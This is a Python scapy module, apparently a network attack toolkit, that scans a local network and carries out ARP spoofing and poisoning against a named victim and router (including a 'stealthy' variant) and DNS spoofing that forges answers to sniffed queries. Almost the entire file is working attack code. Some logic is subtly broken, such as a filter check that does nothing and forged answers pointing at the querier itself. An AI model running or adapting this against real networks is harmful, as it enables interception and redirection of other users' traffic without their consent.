#! /usr/bin/env python
import logging
import Queue

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *


logger = logging.getLogger()
q = Queue.Queue()
q_d = Queue.Queue()


def set_queue(set_q, d=False):
    if not d:
        q.put(set_q)
    else:
        q_d.put(set_q)


def get_queue(d=False):
    if not d:
        q.get(False)
    else:
        q_d.get(False)


def clear_queue(d=False):
    if not d:
        q.queue.clear()
    else:
        q_d.queue.clear()


# Converts the byte formats that scapy returns to something we can read
def format_ip(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = 32 - int(round(math.log(0xFFFFFFFF - bytes_netmask, 2)))
    net = "%s/%s" % (network, netmask)
    if netmask < 16:
        logger.warn("netmask %s too big" % net)
        return None

    return net


# Scans a given scapy net for active devices with the scapy arping method.
# Needs an net and interface as inputs (e.g. scan("192.168.56.0/24", "enp0s3") could work)
# Returns a nested list with IP addresses and the default gateway marked with string Default
def scan(net, interface, timeout=5):
    logger.info("Using scapy arping with %s on %s" % (net, interface))

    found_ips = []
    try:
        # Scan and block scapy from printing a buch of stuff
        sys.stdout = open(os.devnull, 'w')
        ans, unans = scapy.all.arping(net, iface=interface, timeout=timeout, verbose=True)
        sys.stdout = sys.__stdout__
        for s, r in ans:
            ms = [r.src, r.psrc]
            found_ips.append(ms)
            line = r.src + " " + r.psrc
            logger.info(line)
    except socket.error as e:
        raise

    return found_ips


# Method that grabs all the interfaces from the scapy config returns a list with strings
def get_interfaces():
    interfaces = []
    for network, netmask, _, interface, address in scapy.config.conf.route.routes:

        # Skip standard interfaces and invalid netmasks.
        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0' or netmask <= 0 \
                or netmask == 0xFFFFFFFF:
            continue

        # Format the net/ip
        net = format_ip(network, netmask)
        if net:
            interfaces += [net + ", " + interface]

    return interfaces


# Grabs the mac address of a local client
def get_mac(source, dest):
    sys.stdout = open(os.devnull, 'w')
    mac = scapy.all.sr(scapy.all.ARP(op=1, psrc=source, pdst=dest))
    sys.stdout = sys.__stdout__
    for s, r in mac[0][ARP]:
        return r.hwsrc


# Normal way of doing ARP spoofing
def arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac=None):
    # Gets the mac address of the attacker
    interface = scapy.all.get_working_if()
    if attacker_mac is None:
        attacker_mac = scapy.all.get_if_hwaddr(interface)

    # sends packets to the victim and server, performing ARP spoofing
    logger.info("Spoofing " + str(victim_ip))
    sys.stdout = open(os.devnull, 'w')
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac, hwsrc=attacker_mac))
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac, hwsrc=attacker_mac))
    sys.stdout = sys.__stdout__


# Restores the ARP spoofing packets by resetting back to original state
def arp_restore(victim_ip, victim_mac, router_ip, router_mac):
    logger.info("Starting ARP restoration for " + str(victim_ip))
    sys.stdout = open(os.devnull, 'w')
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac),
                   count=4)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac),
                   count=4)
    sys.stdout = sys.__stdout__
    logger.info("Restoration successful")


# Does ARP spoofing but in a more stealthy way
def arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac=None):
    # Gets the mac address of the attacker
    interface = scapy.all.get_working_if()
    if attacker_mac is None:
        attacker_mac = scapy.all.get_if_hwaddr(interface)

    # Sends packet to the server
    logger.info("Spoofing target " + str(victim_ip))
    sys.stdout = open(os.devnull, 'w')
    scapy.all.send(scapy.all.ARP(op=1, hwsrc=attacker_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip))
    sys.stdout = sys.__stdout__


def arp_poison(victim_ip, victim_mac, router_ip, router_mac, attacker_mac, iterations=100):
    logger.info("Start spoofing network on " + str(victim_ip))

    for i in range(iterations):
        try:
            msg = q.get(False)
            if msg == 'stop':
                q_d.put("dns_stop")
                break
            else:
                q.put(msg)
        except Queue.Empty:
            logger.info("Starting iteration " + str(i) + " for " + str(victim_ip))
            arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac)
            time.sleep(2)

    logger.info("Done spoofing")
    sys.exit(1)


def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
    logger.info("Start spoofing network silently on " + str(victim_ip))
    arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac)
    logger.info("Done spoofing")
    sys.exit(1)


# Give the interface of the network, the IP address to spoof a certain IP, if spoof_all is false.
def dns_spoofing(interface, ip, spoof_all=True):
    logger.info("Starting DNS spoofing")
    dns = True
    while dns:
        try:
            msg = q_d.get(False)
            logger.info(msg)
            if msg == 'dns_stop':
                logger.info("Stopping DNS Spoofing")
                dns = False
            else:
                q_d.put(msg)
        except Queue.Empty:
            dns_packet = scapy.all.sniff(iface=interface, filter="dst port 53", count=1)
            logger.info("Packet found. Spoofing DNS packet")

            if not spoof_all:
                if ip != dns_packet[scapy.all.IP].src:
                    pass

            if dns_packet[0].haslayer(scapy.all.TCP):
                dns_source_port = dns_packet[0].getlayer(scapy.all.TCP).sport
            elif dns_packet[0].haslayer(scapy.all.UDP):
                dns_source_port = dns_packet[0].getlayer(scapy.all.UDP).sport
            else:
                pass

            dns_query_id = dns_packet[0].getlayer(scapy.all.DNS).id
            dns_query = dns_packet[0].getlayer(scapy.all.DNS).qd.qname

            if dns_packet[0].haslayer(scapy.all.TCP):
                spoofed_packet = scapy.all.IP(dst=dns_packet[0].getlayer(scapy.all.IP).src) / \
                                 scapy.all.UDP(dport=dns_source_port, sport=dns_packet[0].getlayer(scapy.all.TCP).dport) / \
                                 scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[0].getlayer(scapy.all.DNS).qd,
                                               an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(
                                                   scapy.all.IP).src))
                scapy.all.send(spoofed_packet)
            else:
                spoofed_packet = scapy.all.IP(dst=dns_packet[0].getlayer(scapy.all.IP).src) / \
                                 scapy.all.UDP(dport=dns_source_port, sport=dns_packet[0].getlayer(scapy.all.UDP).dport) / \
                                 scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[0].getlayer(scapy.all.DNS).qd,
                                               an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(
                                                   scapy.all.IP).src))
                scapy.all.send(spoofed_packet)
            logger.info("Sending altered packet")

    logger.info("DNS Spoofing stopped")
    sys.exit(0)

